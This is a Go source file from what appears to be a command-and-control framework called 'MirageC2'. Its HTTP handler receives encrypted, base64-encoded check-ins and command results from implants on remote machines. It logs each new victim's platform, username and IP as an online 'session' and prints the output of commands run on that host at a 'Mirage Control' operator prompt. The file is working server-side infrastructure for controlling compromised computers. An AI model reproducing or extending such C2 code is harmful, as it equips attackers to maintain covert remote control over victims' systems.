package webstart

import (
	"MirageC2_V1.0/app/exchange"
	"MirageC2_V1.0/public/common"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"golang.org/x/text/encoding/simplifiedchinese"
	"golang.org/x/text/transform"
	"io/ioutil"
	"net/http"
	"strconv"
	"strings"
)

const (
	Reset   = "\033[0m"  // 重置为默认样式
	Red     = "\033[31m" // 红色
	Green   = "\033[32m" // 绿色
	Yellow  = "\033[33m" // 黄色
	Blue    = "\033[34m" // 蓝色
	Magenta = "\033[35m" // 品红色
	Cyan    = "\033[36m" // 青色
	White   = "\033[37m" // 白色
)

func DecodeToUTF8(input string) string {
	// 假设输入是 GBK 编码
	decoder := simplifiedchinese.GBK.NewDecoder()
	reader := transform.NewReader(strings.NewReader(input), decoder)
	decoded, err := ioutil.ReadAll(reader)
	if err != nil {
		return input // 如果失败，返回原始数据
	}
	return string(decoded)
}

func DeResult(w http.ResponseWriter, r *http.Request, intID int) {
	body, _ := ioutil.ReadAll(r.Body)
	if string(body) == "{}" {
		return
	}
	var data map[int]string
	if err := json.Unmarshal(body, &data); err != nil {
		http.Error(w, "[-] Failed to parse JSON", http.StatusBadRequest)
		return
	}
	job := &common.Jobs[intID-1]
	key := job.Key
	if value, exists := data[99999]; exists {
		encryptedMessage, _ := base64.StdEncoding.DecodeString(value)
		decodedMessage := exchange.ResultDecode(encryptedMessage, key)
		parts := strings.Split(decodedMessage, "[Mirage]")
		if parts[0] == "First Connection Miragec2" {
			job.Platform = parts[1]
			//job.Processname = parts[2]
			//job.Processid = parts[3]
			job.User = parts[2]
			job.ClientIP = r.RemoteAddr
			fmt.Printf("\n[+] Sessions %d Online: %s -> %s \n", intID, job.ClientIP, job.IPort)
			fmt.Print("Mirage Control > ")
		}
	} else {
		for id, result := range data {
			encryptedMessage, _ := base64.StdEncoding.DecodeString(result)
			decodedMessage := ""
			if job.Platform == "windows" {
				decodedMessage = DecodeToUTF8(exchange.ResultDecode(encryptedMessage, key))
			} else {
				decodedMessage = exchange.ResultDecode(encryptedMessage, key)
			}

			if decodedMessage == "" {
				fmt.Printf("\n[+] Command successfully executed.\n")
			} else {
				//fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s%s%s[-+] Result: ---------------\n", id, Green, decodedMessage, Reset)
				fmt.Printf("\n[+] Command ID: %d \n[-+] Result: --------------- \n%s[-+] Result: ---------------\n", id, decodedMessage)
			}

		}
		fmt.Print("Mirage Control -> Session" + strconv.Itoa(intID) + " > ")
	}
}
